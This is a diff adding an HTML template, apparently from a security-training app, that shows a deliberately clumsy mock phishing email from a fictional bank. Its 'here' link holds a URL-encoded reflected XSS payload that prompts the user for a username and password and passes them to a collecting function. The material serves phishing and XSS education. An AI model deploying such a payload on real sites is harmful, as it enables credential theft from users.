@@ -1,0 +1,20 @@
+<h2><i> Phishing Email Received by Bank Customer </i></h2>
+<br>
+<p><b>From:</b> Vaulty Fault Banks <i>notahacker@legitdomain.ru</i></p>
+<p><b>Subject:</b> irregular activitie</p>
+<p><b>Date:</b> October 31, 2020 02:01 AM PDT</p>
+<p><b>To:</b> Undisclosed Recipients</p>
+<br>
+<p> Dear bank user, </p>
+<br>
+<p> we have detected ununusual activity on your vaulty Fault credit card. </p>
+<p><b>For your protections, we have blocked your credet card!!!</b> </p>
+<p>In order to Review and verify you account activitie, login to you account, please, at: </p>
+<br>
+<p> Click <a href = "/login_xss?username=%3Fuser%3D%27%2F><script>while(!uname){var uname%20=%20prompt(%27Please%20enter%20your%20username:%27);};while(!pword){var pword%20=%20prompt(%27Now%20enter%20your%20password:%27);};xss(uname,pword);</script>" target="_blank">here</a> to login to account </p>
+<br>
+<p><b>if you do not login within 72 hours, you account will be delete!!! </b></p>
+<br>
+<p>	yours in Banking, </p>
+<p>	Manager at the vaulty Fault Bnk </p>
+<script type="text/javascript" src="{{url_for('static', filename='script/login_xss.js')}}"></script>
